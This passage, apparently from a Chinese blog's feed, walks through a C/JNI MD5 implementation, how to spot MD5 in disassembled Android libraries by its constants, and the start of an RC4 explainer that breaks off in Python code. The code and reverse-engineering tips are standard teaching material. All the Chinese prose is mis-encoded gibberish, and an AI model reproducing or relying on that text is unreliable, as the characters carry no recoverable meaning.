class="number">15</span>, <span class="number">21</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leftrotate function definition</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEFTROTATE(x, c) (((x) <span class="string">&lt;&lt; (c)) | ((x) &gt;</span>&gt; (32 - (c))))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">to_bytes</span><span class="params">(<span class="type">uint32_t</span> val, <span class="type">uint8_t</span> *bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    bytes[<span class="number">0</span>] = (<span class="type">uint8_t</span>) val;</span><br><span class="line">    bytes[<span class="number">1</span>] = (<span class="type">uint8_t</span>) (val &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    bytes[<span class="number">2</span>] = (<span class="type">uint8_t</span>) (val &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    bytes[<span class="number">3</span>] = (<span class="type">uint8_t</span>) (val &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">to_int32</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>) bytes[<span class="number">0</span>]</span><br><span class="line">        | ((<span class="type">uint32_t</span>) bytes[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | ((<span class="type">uint32_t</span>) bytes[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        | ((<span class="type">uint32_t</span>) bytes[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">md5</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *initial_msg, <span class="type">size_t</span> initial_len, <span class="type">uint8_t</span> *digest)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// These vars will contain the hash</span></span><br><span class="line">    <span class="type">uint32_t</span> h0, h1, h2, h3;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Message (to prepare)</span></span><br><span class="line">    <span class="type">uint8_t</span> *msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> new_len, offset;</span><br><span class="line">    <span class="type">uint32_t</span> w[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint32_t</span> a, b, c, d, i, f, g, temp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize variables - simple count in nibbles:</span></span><br><span class="line">    h0 = <span class="number">0x67452301</span>;</span><br><span class="line">    h1 = <span class="number">0xefcdab89</span>;</span><br><span class="line">    h2 = <span class="number">0x98badcfe</span>;</span><br><span class="line">    h3 = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Pre-processing:</span></span><br><span class="line">    <span class="comment">//append &quot;1&quot; bit to message</span></span><br><span class="line">    <span class="comment">//append &quot;0&quot; bits until message length in bits â‰¡ 448 (mod 512)</span></span><br><span class="line">    <span class="comment">//append length mod (2^64) to message</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (new_len = initial_len + <span class="number">1</span>; new_len % (<span class="number">512</span>/<span class="number">8</span>) != <span class="number">448</span>/<span class="number">8</span>; new_len++)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    msg = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(new_len + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(msg, initial_msg, initial_len);</span><br><span class="line">    msg[initial_len] = <span class="number">0x80</span>; <span class="comment">// append the &quot;1&quot; bit; most significant bit is &quot;first&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (offset = initial_len + <span class="number">1</span>; offset &lt; new_len; offset++)</span><br><span class="line">        msg[offset] = <span class="number">0</span>; <span class="comment">// append &quot;0&quot; bits</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// append the len in bits at the end of the buffer.</span></span><br><span class="line">    to_bytes(initial_len*<span class="number">8</span>, msg + new_len);</span><br><span class="line">    <span class="comment">// initial_len&gt;&gt;29 == initial_len*8&gt;&gt;32, but avoids overflow.</span></span><br><span class="line">    to_bytes(initial_len&gt;&gt;<span class="number">29</span>, msg + new_len + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process the message in successive 512-bit chunks:</span></span><br><span class="line">    <span class="comment">//for each 512-bit chunk of message:</span></span><br><span class="line">    <span class="keyword">for</span>(offset=<span class="number">0</span>; offset&lt;new_len; offset += (<span class="number">512</span>/<span class="number">8</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// break chunk into sixteen 32-bit words w[j], 0 â‰¤ j â‰¤ 15</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">            w[i] = to_int32(msg + offset + i*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Initialize hash value for this chunk:</span></span><br><span class="line">        a = h0;</span><br><span class="line">        b = h1;</span><br><span class="line">        c = h2;</span><br><span class="line">        d = h3;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Main loop:</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d);</span><br><span class="line">                g = i;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">32</span>) &#123;</span><br><span class="line">                f = (d &amp; b) | ((~d) &amp; c);</span><br><span class="line">                g = (<span class="number">5</span>*i + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">48</span>) &#123;</span><br><span class="line">                f = b ^ c ^ d;</span><br><span class="line">                g = (<span class="number">3</span>*i + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                f = c ^ (b | (~d));</span><br><span class="line">                g = (<span class="number">7</span>*i) % <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);</span><br><span class="line">            a = temp;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add this chunk&#x27;s hash to result so far:</span></span><br><span class="line">        h0 += a;</span><br><span class="line">        h1 += b;</span><br><span class="line">        h2 += c;</span><br><span class="line">        h3 += d;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cleanup</span></span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)</span></span><br><span class="line">    to_bytes(h0, digest);</span><br><span class="line">    to_bytes(h1, digest + <span class="number">4</span>);</span><br><span class="line">    to_bytes(h2, digest + <span class="number">8</span>);</span><br><span class="line">    to_bytes(h3, digest + <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">    JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_roysue_md5_MainActivity_md5</span><span class="params">(JNIEnv *env, jobject thiz, jstring message)</span> &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement md5()</span></span><br><span class="line">    <span class="type">char</span> *msg = const_cast&lt;<span class="type">char</span> *&gt;(env-&gt;GetStringUTFChars(message,<span class="number">0</span>));</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">    <span class="type">uint8_t</span> result[<span class="number">16</span>];</span><br><span class="line">    md5(reinterpret_cast&lt;<span class="type">const</span> <span class="type">uint8_t</span> *&gt;(msg), len, result);</span><br><span class="line">    <span class="type">char</span> res[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">16</span> ;i++)</span><br><span class="line">        <span class="built_in">sprintf</span>(res+i*<span class="number">2</span>,<span class="string">&quot;%2.2x&quot;</span>,result[i]);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MD5å‡½æ•°ç®—æ³•æè¿°"><a href="#MD5å‡½æ•°ç®—æ³•æè¿°" class="headerlink" title="MD5å‡½æ•°ç®—æ³•æè¿°"></a>MD5å‡½æ•°ç®—æ³•æè¿°</h2><p><strong>åˆå§‹åŒ–å‘é‡</strong></p><p>é¦–å…ˆæ˜¯åˆå§‹åŒ–é“¾æ¥å‘é‡ã€‚éœ€è¦4ä¸ªåˆå§‹å€¼ï¼Œæ¯ä¸ªé•¿32bitã€‚å³8ä¸ªåå…­è¿›åˆ¶æ•°ã€‚å®ƒæ˜¯è¿ç®—çš„ä¸»è¦éƒ¨åˆ†ï¼ˆè¿™å—æ˜¯å°ç«¯å­˜å‚¨ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151912016.png" alt="image.png"> </p><p><strong>æ¶ˆæ¯å¡«å……</strong></p><p>é™„åŠ å¡«å……ï¼Œä½¿å¾—å…¶æ¯”ç‰¹é•¿åº¦é™¤ä»¥512ä½™æ•°448ã€‚å¡«å……æ–¹å¼ä¸ºï¼šå…ˆå¡«å……ä¸€ä¸ª1ï¼Œåé¢è·Ÿä¸Šè¶³å¤Ÿå¤šçš„0ï¼Œä¸€ç›´åˆ°ç¬¦åˆè¦æ±‚ã€‚</p><p>åœ¨ä¸Šä¸€æ­¥æ–°ç”Ÿæˆçš„å­—ç¬¦ä¸²åé¢åŠ ä¸Šæ¶ˆæ¯é•¿åº¦ã€‚æ¶ˆæ¯é•¿åº¦ä¸º8å­—èŠ‚&#x3D;64bit</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151913839.png" alt="image.png"> </p><p>é¦–å…ˆå°†åˆå§‹é•¿åº¦*8æ”¾åˆ°å¡«å……å­—ç¬¦ä¸²çš„åé¢ï¼›å¦‚æœåˆå§‹é•¿åº¦è¶…å‡º32ä½è¡¨ç¤ºèŒƒå›´ï¼Œå°±åªå–å®ƒè¶…å‡ºçš„éƒ¨åˆ†ã€‚æ€»å…±æ˜¯8ä¸ªå­—èŠ‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151913948.png" alt="image.png"> </p><p><strong>è¿ç®—</strong></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¾ªç¯ â€œ for(offset&#x3D;0; offset&lt;new_len; offset +&#x3D; (512&#x2F;8)) â€œ æ¯64ä¸ªå­—èŠ‚ä¸ºä¸€ç»„ï¼Œè¿›è¡Œåˆ†ç»„å¤„ç†ã€‚</p><p>å¦‚æœæˆ‘ä»¬æœ¬èº«çš„å­—ç¬¦ä¸²é•¿åº¦å°äº448ï¼Œé‚£ä¹Ÿå°±æ˜¯ä¸ç”¨å¡«å……ã€‚</p><p>å°†64ä¸ªå­—èŠ‚ï¼Œåˆåˆ†ä¸º16ä¸ªå°ç»„ï¼ˆ4å­—èŠ‚&#x3D;32bitï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151914943.png" alt="image.png"> </p><p>ä¸‹é¢å°†4ä¸ªåˆå§‹åŒ–é“¾æ¥å‘é‡è¿›è¡Œäº†å¤„ç†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151914326.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151914016.png" alt="image.png"> </p><p>å¯ä»¥è¡¨ç¤ºä¸ºä¸‹é¢å›¾æ‰€ç¤ºçš„æ ·å­ã€‚ã€‚ã€‚ã€‚ï¼ˆå…·ä½“å®ç°å¯ä»¥ç½‘ä¸ŠæŸ¥ä¸€ä¸‹ï¼‰</p><p>Aâ€”&gt;ç»è¿‡è¿ç®—â€”&gt;B </p><p>Bâ€”&gt;ç›´æ¥â€”&gt;C</p><p>Câ€”&gt;ç›´æ¥â€”&gt;D </p><p>Dâ€”&gt;ç›´æ¥â€”&gt;A</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151915529.png" alt="image.png"> </p><p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾ä¸­æœ‰Fã€Miã€Kiç­‰æ ‡è¯†ã€‚</p><ul><li>Fï¼šå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œä¸‹é¢ä¼šç»†è¯´</li><li>Miï¼šè¡¨ç¤ºä¸€ç§è¿ç®—ï¼Œç®€å•ç†è§£å°±æ˜¯+-*&#x2F;</li><li>Kiï¼šæ˜¯ä¸€ç§å‚ä¸è¿ç®—çš„ç‰¹å®šåºåˆ—ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ä¸€èˆ¬æƒ…å†µï¼Œè¯¥åºåˆ—æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå°±æ˜¯Kiå¦‚æœæ²¡æœ‰ä¿®æ”¹è¿‡ï¼Œæ˜¯ä¸ä¼šå˜åŒ–çš„ã€‚è¿™ä¸ªä¹Ÿæ˜¯è¾¨åˆ«å½“å‰ç®—æ³•æ˜¯å¦ä¸ºmd5çš„ä¸€ä¸ªæ€è·¯ã€‚</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151915866.png" alt="image.png"> </p><p>å…¶å®å›¾ä¸­çš„Fç¡®å®è¡¨ç¤ºçš„æ˜¯å‡½æ•°ï¼Œä½†ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯4ä¸ªå‡½æ•°ï¼Œæ¥æ”¶ä¸‰ä¸ªå‚æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">F</span>(X,Y,Z) = (X&amp;Y)|((~X)&amp;Z)</span><br><span class="line"><span class="title function_">G</span>(X,Y,Z) = (X&amp;Z)|(Y&amp;(~Z))</span><br><span class="line"><span class="title function_">H</span>(X,Y,Z) = X^Y^Z</span><br><span class="line"><span class="title function_">I</span>(X,Y,Z) = Y^(X|(~Z))</span><br></pre></td></tr></table></figure><h1 id="MD5æ±‡ç¼–ç®—æ³•è¯†åˆ«"><a href="#MD5æ±‡ç¼–ç®—æ³•è¯†åˆ«" class="headerlink" title="MD5æ±‡ç¼–ç®—æ³•è¯†åˆ«"></a>MD5æ±‡ç¼–ç®—æ³•è¯†åˆ«</h1><p><strong>ã€å°æŠ€å·§ã€‘</strong></p><p>å¯ä»¥å€ŸåŠ©PEIDä¸­çš„æ’ä»¶ã€Krypto ANALyzerã€‘å®ç°å¯¹soä¸­çš„åŠ å¯†ç®—æ³•è¿›è¡Œç®€å•åˆ†æã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916512.png" alt="img"> </p><p>IDAåŠ è½½soæ–‡ä»¶åï¼Œå®šä½åˆ°md5å‡½æ•°ä¸ºæ­¢</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916536.png" alt="image.png"> </p><p>æœ‰å‡ ä¸ªå…³é”®ç‚¹ï¼Œå¯ä»¥å¸®åŠ©åˆ¤æ–­å½“å‰ç®—æ³•æ˜¯å¦ä¸ºMD5</p><p>ä¸€ã€4ä¸ªåˆå§‹åŒ–é“¾æ¥å‘é‡</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916504.png" alt="image.png"> </p><p>äºŒã€ä¸¤ä¸ªå›ºå®šæ•°ç»„ï¼ˆåŠ æ³•å¸¸æ•°çŸ©é˜µ+å¾ªç¯å·¦ç§»è¡¨ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916094.png" alt="image.png"> </p><p>ä¸Šé¢è¿™ä¸¤ä¸ªç‚¹ï¼Œå¯ä»¥ä½œä¸ºmd5ç®—æ³•è¯†åˆ«çš„å‚è€ƒã€‚</p><p>åŒæ—¶ï¼Œå¦‚æœå¯¹MD5ç®—æ³•é­”æ”¹ï¼Œå…¶å®ä¹Ÿæ˜¯ä¿®æ”¹<code>å¸¸é‡ABCD</code> å’Œ <code>åŠ æ³•å¸¸æ•°çŸ©é˜µ</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> å“ˆå¸Œç®—æ³• </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹RC4</title>
      <link href="/2024/06/13/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRC4/"/>
      <url>/2024/06/13/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRC4/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-ç®€ä»‹"><a href="#ä¸€-ç®€ä»‹" class="headerlink" title="ä¸€ ç®€ä»‹"></a>ä¸€ ç®€ä»‹</h1><h2 id="ä¸€æ¬¡ä¸€å¯†"><a href="#ä¸€æ¬¡ä¸€å¯†" class="headerlink" title="ä¸€æ¬¡ä¸€å¯†"></a>ä¸€æ¬¡ä¸€å¯†</h2><p><strong>å¯¹ç§°åŠ å¯†ç®—æ³•</strong>ï¼šä½¿ç”¨æœ€å¹¿æ³›çš„æµå¯†ç å°±æ˜¯RC4</p><p>ä¼˜ç‚¹ï¼šå¯†é’¥éšæœºäº§ç”Ÿï¼Œåªä½¿ç”¨ä¸€æ¬¡ï¼›æ— æ¡ä»¶å®‰å…¨ã€åŠ è§£å¯†ä½åŠ æ³•è¿ç®—æ•ˆç‡é«˜</p><p>ç¼ºç‚¹ï¼šè¦æ±‚å¯†é’¥è‡³å°‘ä¸æ˜æ–‡ä¸€æ ·é•¿ï¼Œå¯†é’¥å…±äº«å›°éš¾</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131348677.png" alt="img"> </p><h2 id="æµå¯†ç ï¼ˆåºåˆ—å¯†ç ï¼‰"><a href="#æµå¯†ç ï¼ˆåºåˆ—å¯†ç ï¼‰" class="headerlink" title="æµå¯†ç ï¼ˆåºåˆ—å¯†ç ï¼‰"></a>æµå¯†ç ï¼ˆåºåˆ—å¯†ç ï¼‰</h2><ul><li>æµå¯†ç åŸºæœ¬æ€æƒ³ï¼š</li></ul><p>å¯†é’¥æµå‘ç”Ÿå™¨fäº§ç”Ÿzi&#x3D;f(k,Ïƒ \sigmaÏƒi)ï¼Œå³ç§å­å¯†é’¥käº§ç”Ÿå¯†é’¥æµz&#x3D;z0z1z2â€¦</p><p>åŠ å¯†y&#x3D;y0y1y2â€¦&#x3D;Ez0(x0)Ez1(x1)Ez2(x2)â€¦</p><ul><li>æœ‰å†…éƒ¨è®°å¿†åŸä»¶çš„ä¸ºæµå¯†ç ï¼Œå¦åˆ™åˆ†ç»„å¯†ç </li><li>å†…éƒ¨è®°å¿†åŸä»¶çŠ¶æ€Ïƒ \sigmaÏƒiç‹¬ç«‹äºæ˜æ–‡çš„ç§°åŒæ­¥æµå¯†ç ï¼Œå¦åˆ™è‡ªåŒæ­¥æµå¯†ç </li><li>åŒæ­¥æµå¯†ç åŠ å¯†å™¨&#x3D;æ»šåŠ¨å¯†é’¥ç”Ÿæˆå™¨+åŠ å¯†å˜æ¢å™¨</li><li>äºŒå…ƒåŠ æ³•æµå¯†ç ï¼ŒåŠ å¯†å˜æ¢yi&#x3D;ziâ¨ \bigoplusâ¨xi</li><li>ä¸€æ¬¡ä¸€å¯†æ˜¯åŠ æ³•æµå¯†ç åŸå‹ï¼Œè‹¥zi&#x3D;ki,åˆ™åŠ æ³•æµå¯†ç å°±é€€åŒ–æˆä¸€æ¬¡ä¸€å¯†</li><li>å¯†é’¥æµåºåˆ—æ€§è´¨ï¼šæå¤§çš„å‘¨æœŸã€è‰¯å¥½çš„ç»Ÿè®¡ç‰¹æ€§ã€æŠ—çº¿æ€§åˆ†æã€æŠ—ç»Ÿè®¡åˆ†æ</li><li>ä¸€æ¬¡ä¸€å¯†çš„å¯†é’¥é•¿åº¦å’Œæ˜æ–‡ä¸€æ ·é•¿ï¼Œæµå¯†ç ä¸æ˜¯ï¼Œéœ€è¦ç§å­å¯†é’¥é€šè¿‡å¯†é’¥ç”Ÿæˆå™¨äº§ç”Ÿå¯†é’¥æµ</li></ul><h1 id="äºŒ-RC4ç®—æ³•åŸç†"><a href="#äºŒ-RC4ç®—æ³•åŸç†" class="headerlink" title="äºŒ RC4ç®—æ³•åŸç†"></a>äºŒ RC4ç®—æ³•åŸç†</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>é¦–å…ˆï¼ŒRC4ç®—æ³•æ‰€ä¾èµ–çš„æœ€æ ¹æœ¬åŸç†æ˜¯ï¼šå¯¹æ˜æ–‡ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥å¼‚æˆ–ä¸¤æ¬¡æœ€åä»æ˜¯å¾—åˆ°åŸæ–‡ã€‚å³ç”Ÿæˆå¯†é’¥ä¹‹åï¼Œç”±å¯†é’¥ä¸æ˜æ–‡å¼‚æˆ–åç”Ÿæˆå¯†æ–‡ï¼ˆåŠ å¯†è¿‡ç¨‹ï¼‰ï¼Œç”±åŒä¸€å¯†é’¥ä¸å¯†æ–‡å¼‚æˆ–åå¾—åˆ°æ˜æ–‡ï¼ˆè§£å¯†è¿‡ç¨‹ï¼‰ã€‚</p><p><strong>åœ¨ä»‹ç»RC4ç®—æ³•åŸç†ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹ç®—æ³•ä¸­çš„å‡ ä¸ªå…³é”®å˜é‡ï¼š</strong></p><p>1ã€å¯†é’¥æµï¼šRC4ç®—æ³•çš„å…³é”®æ˜¯æ ¹æ®æ˜æ–‡å’Œå¯†é’¥ç”Ÿæˆç›¸åº”çš„å¯†é’¥æµï¼Œå¯†é’¥æµçš„é•¿åº¦å’Œæ˜æ–‡çš„é•¿åº¦æ˜¯å¯¹åº”çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜æ–‡çš„é•¿åº¦æ˜¯500å­—èŠ‚ï¼Œé‚£ä¹ˆå¯†é’¥æµä¹Ÿæ˜¯500å­—èŠ‚ã€‚å½“ç„¶ï¼ŒåŠ å¯†ç”Ÿæˆçš„å¯†æ–‡ä¹Ÿæ˜¯500å­—èŠ‚ï¼Œå› ä¸ºå¯†æ–‡ç¬¬iå­—èŠ‚&#x3D;æ˜æ–‡ç¬¬iå­—èŠ‚^å¯†é’¥æµç¬¬iå­—èŠ‚ï¼›</p><p>2ã€çŠ¶æ€å‘é‡Sï¼šé•¿åº¦ä¸º256ï¼ŒS[0],S[1]â€¦..S[255]ã€‚æ¯ä¸ªå•å…ƒéƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œç®—æ³•è¿è¡Œçš„ä»»ä½•æ—¶å€™ï¼ŒSéƒ½åŒ…æ‹¬0-255çš„8æ¯”ç‰¹æ•°çš„æ’åˆ—ç»„åˆï¼Œåªä¸è¿‡å€¼çš„ä½ç½®å‘ç”Ÿäº†å˜æ¢ï¼›</p><p>3ã€ä¸´æ—¶å‘é‡Tï¼šé•¿åº¦ä¹Ÿä¸º256ï¼Œæ¯ä¸ªå•å…ƒä¹Ÿæ˜¯ä¸€ä¸ªå­—èŠ‚ã€‚å¦‚æœå¯†é’¥çš„é•¿åº¦æ˜¯256å­—èŠ‚ï¼Œå°±ç›´æ¥æŠŠå¯†é’¥çš„å€¼èµ‹ç»™Tï¼Œå¦åˆ™ï¼Œè½®è½¬åœ°å°†å¯†é’¥çš„æ¯ä¸ªå­—èŠ‚èµ‹ç»™Tï¼›</p><p>4ã€å¯†é’¥Kï¼šé•¿åº¦ä¸º1-256å­—èŠ‚ï¼Œæ³¨æ„å¯†é’¥çš„é•¿åº¦keylenä¸æ˜æ–‡é•¿åº¦ã€å¯†é’¥æµçš„é•¿åº¦æ²¡æœ‰å¿…ç„¶å…³ç³»ï¼Œé€šå¸¸å¯†é’¥çš„é•¿åº¦è¶£å‘³16å­—èŠ‚ï¼ˆ128æ¯”ç‰¹ï¼‰ã€‚</p><h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><p>ä¸‹é¢æ˜¯å¯¹RC4ç®—æ³•å…·ä½“å®ç°çš„ç®€å•ä»‹ç»ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131406862.png" alt="img"> </p><p>1ã€å…ˆåˆå§‹åŒ–çŠ¶æ€å‘é‡Sï¼ˆ256ä¸ªå­—èŠ‚ï¼Œç”¨æ¥ä½œä¸ºå¯†é’¥æµç”Ÿæˆçš„ç§å­1ï¼‰</p><p>æŒ‰ç…§å‡åºï¼Œç»™æ¯ä¸ªå­—èŠ‚èµ‹å€¼0,1,2,3,4,5,6â€¦..,254,255</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131406935.png" alt="img"> </p><p>2ã€åˆå§‹å¯†é’¥ï¼ˆç”±ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œé•¿åº¦ä»»æ„ã€‚å¦‚æœè¾“å…¥é•¿åº¦å°äº256ä¸ªå­—èŠ‚ï¼Œåˆ™è¿›è¡Œè½®è½¬ï¼Œç›´åˆ°å¡«æ»¡ã€‚ä¾‹å¦‚è¾“å…¥å¯†é’¥çš„æ˜¯â€œ1,2,3,4,5â€, é‚£ä¹ˆå¡«å…¥çš„æ˜¯1,2,3,4,5, 1,2,3,4,5, 1,2,3,4,5â€¦â€¦..</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131407542.png" alt="img"> </p><p>ç”±ä¸Šè¿°è½®è½¬è¿‡ç¨‹å¾—åˆ°256ä¸ªå­—èŠ‚çš„å‘é‡Tï¼ˆç”¨æ¥ä½œä¸ºå¯†é’¥æµç”Ÿæˆçš„ç§å­2ï¼‰ã€‚</p><p>3ã€å¼€å§‹å¯¹çŠ¶æ€å‘é‡Sè¿›è¡Œç½®æ¢æ“ä½œï¼ˆç”¨æ¥æ‰“ä¹±åˆå§‹ç§å­1ï¼‰ï¼ŒæŒ‰ç…§ä¸‹åˆ—è§„åˆ™è¿›è¡Œï¼š</p><p>ä»ç¬¬é›¶ä¸ªå­—èŠ‚å¼€å§‹ï¼Œæ‰§è¡Œ256æ¬¡ï¼Œä¿è¯æ¯ä¸ªå­—èŠ‚éƒ½å¾—åˆ°å¤„ç†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131407174.png" alt="img"> </p><p>4ã€æœ€åæ˜¯ç§˜é’¥æµçš„ç”Ÿæˆä¸åŠ å¯†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131408206.png" alt="img"> </p><p>ä¸Šé¢å››ä¸ªæ­¥éª¤ç®€å•<strong>æ€»ç»“</strong>ä¸€ä¸‹ï¼š</p><ul><li>ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆäº†åˆå§‹çŠ¶æ€å‘é‡S</li><li>ç¬¬äºŒæ­¥ï¼šè¾“å…¥åˆå§‹å¯†é’¥ï¼Œç”Ÿæˆä¸´æ—¶å‘é‡T</li><li>ç¬¬ä¸‰æ­¥ï¼šå¯¹çŠ¶æ€å‘é‡Sè¿›è¡Œç½®æ¢æ“ä½œï¼Œæ‰“ä¹±åˆå§‹ç§å­ï¼Œç”ŸæˆSâ€™</li><li>ç¬¬å››æ­¥ï¼šä½¿ç”¨æ˜æ–‡å’ŒSâ€˜ç”Ÿæˆæœ€ç»ˆåŠ å¯†çš„å¯†é’¥æµ</li><li>ç¬¬äº”æ­¥ï¼šä½¿ç”¨å¯†é’¥æµå¯¹æ˜æ–‡è¿›è¡Œå¼‚æˆ–ï¼Œå®ç°æœ€ç»ˆåŠ å¯†ã€‚</li></ul><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>å…·ä½“å®ç°ä»£ç å¦‚ä¸‹ï¼š<a href="https://github.com/qiaoao-spec/RC4">RC4åŠ è§£å¯†ç®—æ³•</a></p><p>è§£å¯†æŒ‰ç…§å‰é¢å†™çš„ï¼Œå¼‚æˆ–ä¸¤æ¬¡å°±æ˜¯åŸæ–‡ï¼Œæ‰€ä»¥åªè¦æŠŠå¯†é’¥æµé‡æ–°æ‹¿è¿‡æ¥å¼‚æˆ–ä¸€æ¬¡å°±èƒ½å¾—åˆ°åŸæ–‡äº†</p><p>ä¸‹é¢æ˜¯è°ƒç”¨<strong>python</strong>ç®€å•å®ç°çš„ä¸Šè¿°æ‰€è¯´ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_S</span>():</span><br><span 